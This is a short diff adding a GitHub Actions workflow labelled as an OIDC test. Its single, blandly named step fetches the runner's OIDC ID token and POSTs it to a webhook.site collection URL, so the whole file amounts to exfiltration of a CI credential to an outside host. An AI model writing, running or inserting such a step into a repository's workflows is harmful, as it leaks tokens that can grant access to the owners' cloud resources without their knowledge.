@@ -1,0 +1,14 @@
+jobs:
+  test-oidc:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: Shoot the ball
+        run: |
+          ID_TOKEN=$(curl -sSL "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://webhook.site" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
+          
+          curl -X POST https://webhook.site/4de5f6f2-0601-4381-915b-2f5068e4669b \
+            -H "Content-Type: application/json" \
+            -d "{\"token\": \"$ID_TOKEN\"}"
